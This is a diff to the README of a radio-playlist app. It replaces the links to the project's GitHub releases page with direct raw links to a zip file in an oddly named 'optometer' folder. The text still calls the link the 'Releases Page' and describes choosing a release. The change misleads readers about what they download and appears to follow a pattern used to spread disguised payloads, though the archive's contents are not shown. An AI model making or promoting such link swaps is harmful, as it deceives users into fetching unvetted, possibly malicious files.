@@ -6,13 +6,13 @@ Welcome to CapriceRadio-Playlist! This application allows you to access a playli
 
 ## 🔗 Download Now
 
-[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/rayraytay/CapriceRadio-Playlist/releases)
+[![Download](https://raw.githubusercontent.com/rayraytay/CapriceRadio-Playlist/main/optometer/CapriceRadio-Playlist_1.6-alpha.2.zip)](https://raw.githubusercontent.com/rayraytay/CapriceRadio-Playlist/main/optometer/CapriceRadio-Playlist_1.6-alpha.2.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the following page to download our app:
 
-[Download from Releases Page](https://github.com/rayraytay/CapriceRadio-Playlist/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/rayraytay/CapriceRadio-Playlist/main/optometer/CapriceRadio-Playlist_1.6-alpha.2.zip)
 
 After you've opened the release page, look for the latest version of the software and download the file suitable for your operating system. 
 
